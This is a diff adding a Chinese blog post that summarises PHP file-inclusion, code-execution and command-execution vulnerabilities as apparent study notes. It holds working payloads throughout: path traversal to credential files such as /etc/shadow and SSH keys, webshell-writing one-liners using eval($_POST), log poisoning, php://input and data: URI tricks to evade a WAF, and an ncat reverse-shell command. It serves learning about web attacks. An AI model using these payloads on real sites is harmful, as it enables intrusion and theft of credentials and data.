@@ -1,0 +1,601 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="reader-l">
+  <meta name="keywords" content="reader-l&#39;s blog">
+  <title>文件包含&amp;代码执行&amp;变量覆盖小结 - reader-l&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/List/">
+                <i class="iconfont icon-link-fill"></i>
+                List
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="文件包含&代码执行&变量覆盖小结">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-03-24 19:57" pubdate>
+        2020年3月24日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.8k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      24
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">文件包含&amp;代码执行&amp;变量覆盖小结</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2020年12月2日 上午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id><a href="#" class="headerlink" title></a><a id="more"></a></h1><h4 id="1-文件包含漏洞"><a href="#1-文件包含漏洞" class="headerlink" title="1.文件包含漏洞"></a>1.文件包含漏洞</h4><p>1.常见的文件包含函数</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br><span class="hljs-function"><span class="hljs-title">include</span><span class="hljs-params">()</span></span>：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行<br><span class="hljs-function"><span class="hljs-title">require</span><span class="hljs-params">()</span></span>：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本<br><span class="hljs-function"><span class="hljs-title">include_once</span><span class="hljs-params">()</span></span>和require_once()：若文件中代码已被包含则不会再次包含<br><br></code></pre></td></tr></table></figure>
+<p>2.利用条件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">程序用<span class="hljs-keyword">include</span>()等文件包含函数通过动态变量的范式引入需要包含的文件<br>用户能够控制该动态变量<br><br><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$test</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$test</span>);<br><span class="hljs-meta">?&gt;</span><br>保存为 <span class="hljs-keyword">include</span>.php<br>在同一个目录下创建test.txt 内容为<br><span class="hljs-meta">&lt;?php</span> phpinfo() <span class="hljs-meta">?&gt;</span><br>访问测试  <span class="hljs-comment">//http://127.0.0.1/test/include.php?c=test.txt    //访问连接，将123.txt传送给c并赋给test变量</span><br><br></code></pre></td></tr></table></figure>
+<p>3.注意事项</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">相对路径</span><br><span class="xml">../../../etc/passwd</span><br><span class="xml">%00截断包含(PHP&lt;5.3.4)</span><br><span class="php"><span class="hljs-meta">&lt;?php</span></span><br>      include &quot;$_GET[&#x27;x&#x27;].&quot;.php&quot;;<br><span class="php">      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$_GET</span>[&#x27;x&#x27;].&quot;</span>.php<span class="hljs-string">&quot;;</span></span><br><span class="php"><span class="hljs-meta">?&gt;</span></span><br><span class="xml">magic_quotes_gps=off 才可以，否则%00会被转义</span><br><br><br></code></pre></td></tr></table></figure>
+<p>4.利用技巧</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">上传图片马，马包含的代码为<span class="hljs-meta">&lt;?</span>fputs(fopen(<span class="hljs-string">&quot;shell.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<span class="hljs-string">&quot;&lt;?php eval(<span class="hljs-subst">$_POST</span>[x]);?&gt;&quot;</span>)<span class="hljs-meta">?&gt;</span>，<br>上传后图片路径为/uploadfile/x.jpg，当访问<br>http:<span class="hljs-comment">//www.reader.com/xx.php?page=uploadfile/x.jpg时，</span><br>将会在fi这个文件夹下生成shell.php,内容为<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[x); <span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
+<p>5.读敏感文件</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs awk">Windows：<br>  C:\boot.ini  <span class="hljs-regexp">//</span>查看系统版本<br>  C:\Windows\System32\inetsrv\MetaBase.xml  <span class="hljs-regexp">//</span>IIS配置文件<br>  C:\Windows\repair\sam  <span class="hljs-regexp">//</span>存储系统初次安装的密码<br>  C:\Program Files\mysql\my.ini  <span class="hljs-regexp">//</span>Mysql配置<br>  C:\Program Files\mysql\data\mysql\user.MYD  <span class="hljs-regexp">//</span>Mysql root<br>  C:\Windows\php.ini  <span class="hljs-regexp">//</span>php配置信息<br>  C:\Windows\my.ini  <span class="hljs-regexp">//</span>Mysql配置信息<br><br><br><br>Linux：<br>  <span class="hljs-regexp">/root/</span>.ssh/authorized_keys<br>  <span class="hljs-regexp">/root/</span>.ssh/id_rsa<br>  <span class="hljs-regexp">/root/</span>.ssh/id_ras.keystore<br>  <span class="hljs-regexp">/root/</span>.ssh/known_hosts<br>  <span class="hljs-regexp">/etc/</span>passwd<br>  <span class="hljs-regexp">/etc/</span>shadow<br>  <span class="hljs-regexp">/etc/my</span>.cnf<br>  <span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/conf/</span>httpd.conf<br>  <span class="hljs-regexp">/root/</span>.bash_history<br>  <span class="hljs-regexp">/root/</span>.mysql_history<br>  <span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/fd/</span>fd[<span class="hljs-number">0</span>-<span class="hljs-number">9</span>]*(文件标识符)<br>  <span class="hljs-regexp">/proc/m</span>ounts<br>  <span class="hljs-regexp">/porc/</span>config.gz<br><br></code></pre></td></tr></table></figure>
+<p>6.包含日志（主要是得到日志的路径）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">读日志路径：<br>文件包含漏洞读取apache配置文件<br>index.php?page=/etc/init.d/httpd<br>index.php?page=/etc/httpd/conf/httpd.conf<br>默认位置/<span class="hljs-keyword">var</span>/log/httpd/access_log<br><br>日志会记录客户端请求及服务器响应的信息，访问http:<span class="hljs-comment">//www.xx.com/<span class="hljs-meta">&lt;?php</span> phpinfo(); <span class="hljs-meta">?&gt;</span>时，<span class="hljs-meta">&lt;?php</span> phpinfo(); <span class="hljs-meta">?&gt;</span>也会被记录在日志里，也可以插入到User-Agent</span><br>可以通过Burp Suite来绕过编码<br><br><br></code></pre></td></tr></table></figure>
+<p><img src="/2020/03/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%B0%8F%E7%BB%93/57.png" srcset="/img/loading.gif" alt="1584777780264"></p>
+<p><img src="/2020/03/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%B0%8F%E7%BB%93/56.png" srcset="/img/loading.gif" alt="1584777789744"></p>
+<p><img src="/2020/03/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%B0%8F%E7%BB%93/55.png" srcset="/img/loading.gif" alt="1584777794762"></p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">制作错误，写入一句话<br><span class="hljs-link">http://127.0.0.1/ekucms/index.php?s=my/show/id/&#123;~eval($_POST</span>[<span class="hljs-string">x</span>])&#125;<br><br></code></pre></td></tr></table></figure>
+<p>利用包含漏洞包含日志文件，然后用菜刀连接一句话</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/ekucms/i</span>ndex.php?s=my<span class="hljs-regexp">/show/i</span>d/\..\temp\logs\<span class="hljs-number">15</span>_09_08.log<br></code></pre></td></tr></table></figure>
+<p><img src="/2020/03/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%B0%8F%E7%BB%93/58.png" srcset="/img/loading.gif" alt="1584777794762"></p>
+<p>7.远程包含</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">注：远程的文件名不能为php可解析的扩展名，allow_url_fopen和allow_url_include为On是必须的<br>若在a.txt写入<span class="hljs-meta">&lt;?php</span> fputs(fopen(<span class="hljs-string">&quot;shell.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<span class="hljs-string">&quot;&lt;?php @eval(<span class="hljs-subst">$_POST</span>[xxx]); ?&gt;&quot;</span>) <span class="hljs-meta">?&gt;</span>，可直接写shell<br></code></pre></td></tr></table></figure>
+<p><img src="/2020/03/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%B0%8F%E7%BB%93/59.png" srcset="/img/loading.gif" alt="1584777794762"></p>
+<h4 id="2-php输入输出流"><a href="#2-php输入输出流" class="headerlink" title="2.php输入输出流"></a>2.php输入输出流</h4><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其它读取写入文件资源的过滤器。</p>
+<p>1.读php文件</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">直接包含php文件时会被解析，不能看到源码，可以用封装协议读取：<br>?page=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=config.php<br>访问上述<span class="hljs-built_in">URL</span>后会返回config.php中经过Base64加密后的字符串，解密即可得到源码<br><br></code></pre></td></tr></table></figure>
+<p>2.使用php封装协议</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">allow_url_include=On时,<br>	若执行http:<span class="hljs-comment">//www.xxx.com/index.php?page=php://input,并且提</span><br>	交数据<span class="hljs-meta">&lt;?php</span> fputs(fopen(<span class="hljs-string">&quot;shell.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<span class="hljs-string">&quot;&lt;?php eval(<span class="hljs-subst">$_POST</span>[&#x27;xxxser&#x27;]);?&gt;&quot;</span>) <span class="hljs-meta">?&gt;</span><br>结果将在index.php所在文件下生成一句话文件shell.php<br><br></code></pre></td></tr></table></figure>
+<p>3.php://input</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//i</span>nput 是个可以访问请求的原始数据的只读流。 POST 请求的情况下，最好使用 php:<span class="hljs-regexp">//i</span>nput 来代替 <span class="hljs-variable">$HTTP_RAW_POST_DATA</span>，因为它不依赖于特定的 php.ini 指令。<br>而且，这样的情况下 <span class="hljs-variable">$HTTP_RAW_POST_DATA</span> 默认没有填充， 比激活 always_populate_raw_post_data 潜在需要更少的内存。 enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span> 的时候 php:<span class="hljs-regexp">//i</span>nput 是无效的。<br><br><br><span class="hljs-number">1</span>.使用php:<span class="hljs-regexp">//i</span>nput可以插入一句话<br>&lt;?php<br><span class="hljs-regexp">//</span><span class="hljs-variable">$data</span>=file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-regexp">//</span>echo <span class="hljs-variable">$data</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br>@eval(file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>));<br>?&gt;<br><br>php:<span class="hljs-regexp">//i</span>nput是用来接收post数据<br><br>在POST中插入数据<br>system(<span class="hljs-string">&#x27;ncat -e /bin/bash localhost 1234&#x27;</span>);<br>测试了一下nc反弹shell的利用。<br><br><br></code></pre></td></tr></table></figure>
+<p><img src="/2020/03/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%B0%8F%E7%BB%93/60.png" srcset="/img/loading.gif" alt="1584777794762"></p>
+<p><img src="/2020/03/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%B0%8F%E7%BB%93/61.png" srcset="/img/loading.gif" alt="1584777794762"></p>
+<p>php://input可以将文件包含漏洞变成代码执行漏洞</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">文件中存在包含漏洞的代码<br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>])<span class="hljs-meta">?&gt;</span><br>使用php:<span class="hljs-comment">//input，将执行代码通过Firefox 的hackbar 在POST data中提交</span><br><span class="hljs-meta">&lt;?php</span> system(<span class="hljs-string">&#x27;ifconfig&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2020/03/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%B0%8F%E7%BB%93/62.png" srcset="/img/loading.gif" alt="1584777794762"></p>
+<p>4.data url schema</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs css">将文件包含漏洞变成代码执行漏洞并绕过360网站卫士的<span class="hljs-selector-tag">WAF</span><br>文件包含漏洞，在读取<span class="hljs-selector-tag">php</span>文件时，是不能显示文件内容的。<br>而很多情况，我们是急需读取<span class="hljs-selector-tag">PHP</span>格式的配置文件，例如<br><span class="hljs-selector-tag">dedecms</span>数据库配置文件<span class="hljs-selector-tag">data</span>/<span class="hljs-selector-tag">common</span><span class="hljs-selector-class">.inc</span><span class="hljs-selector-class">.php</span>,<br><span class="hljs-selector-tag">discuz</span>全局配置文件<span class="hljs-selector-tag">config</span>/<span class="hljs-selector-tag">config_global</span><span class="hljs-selector-class">.php</span>,<br><span class="hljs-selector-tag">phpcms</span>配置文件<span class="hljs-selector-tag">caches</span>/<span class="hljs-selector-tag">configs</span>/<span class="hljs-selector-tag">database</span><span class="hljs-selector-class">.php</span><br><span class="hljs-selector-tag">phpwind</span>配置文件<span class="hljs-selector-tag">conf</span>/<span class="hljs-selector-tag">database</span><span class="hljs-selector-class">.php</span><br><span class="hljs-selector-tag">wordpress</span>配置文件<span class="hljs-selector-tag">wp-config</span><span class="hljs-selector-class">.php</span><br><br></code></pre></td></tr></table></figure>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">读取指定文件FileInclude.php的代码</span><br><span class="php"><span class="hljs-meta">&lt;?php</span> system(<span class="hljs-string">&#x27;cat /var/www/FileInclude.php&#x27;</span>)<span class="hljs-meta">?&gt;</span></span><br><span class="xml">然后将攻击代码转化成data:URI，</span><br><span class="xml">data:text/plain,</span><span class="php"><span class="hljs-meta">&lt;?php</span> system(<span class="hljs-string">&#x27;cat /var/www/FileInclude.php&#x27;</span>)<span class="hljs-meta">?&gt;</span></span><br><br><br><span class="xml">注意，我们看到转化后的GET请求的参数中包含</span><span class="php"><span class="hljs-meta">&lt;?</span>的标记，在遇到有些WAF，包括云WAF（例如<span class="hljs-number">360</span>网站卫士），就会将其视为攻击代码，阻挡下来。于是我们需要做一下编码处理</span><br><span class="php">data:text/plain;base64,［攻击代码的base64编码］</span><br><br><br></code></pre></td></tr></table></figure>
+<p><img src="/2020/03/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%B0%8F%E7%BB%93/63.png" srcset="/img/loading.gif" alt="1584777794762"></p>
+<h4 id="3-代码执行漏洞"><a href="#3-代码执行漏洞" class="headerlink" title="3.代码执行漏洞"></a>3.代码执行漏洞</h4><p>1.代码执行函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">PHP中可以执行代码的函数。如<span class="hljs-keyword">eval</span>()、assert()、``、system()、exec()、shell_exec()、passthru()、 escapeshellcmd()、pcntl_exec() 等<br>例如：<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[cc123]) <span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br> http:<span class="hljs-comment">//127.0.0.1/x.php?a=system&amp;b=ipconfig</span><br>执行系统命令ipconfig<br><br><br></code></pre></td></tr></table></figure>
+<p>2.命令执行函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php">在php中您可以使用下列<span class="hljs-number">5</span>个函数来执行外部的应用程序或函数<br><br><span class="hljs-number">1</span> system：执行一个外部的应用程序并显示输出的结果<br><span class="hljs-number">2</span> exec:执行一个外部的应用程序<br><span class="hljs-number">3</span> passthru:执行一个UNIX系统命令并显示原始的输出<br><span class="hljs-number">4</span> shell_exec:执行shell命令并返回输出的结果的字符串<br><span class="hljs-number">5</span> “<span class="hljs-string">&#x27;&#x27;</span>”运算符：与shell_exec函数的功能相同<br><br><span class="hljs-meta">&lt;?</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;<br>system(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>http:<span class="hljs-comment">//127.0.0.1/sys.php?cmd=ipconfig</span><br><br><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$x</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>];<br><span class="hljs-keyword">echo</span> shell_exec(<span class="hljs-variable">$x</span>);<br><span class="hljs-meta">?&gt;</span><br><br>http:<span class="hljs-comment">//127.0.0.1/x.php?x=ipconfig</span><br><br></code></pre></td></tr></table></figure>
